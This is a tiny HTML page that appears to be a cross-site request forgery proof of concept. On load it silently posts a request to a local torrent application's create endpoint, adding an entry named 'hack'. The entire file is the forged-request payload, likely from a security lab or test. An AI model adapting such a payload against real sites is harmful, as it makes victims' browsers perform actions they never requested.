<script src= //code.jquery.com/jquery-1.11.0.min.js></script>
<script>
    $.post("http://localhost:8080/torrents/create", {
        torrent_name: "hack",
        torrent_type: "hack-type",
        torrent_size: 666
    })
</script>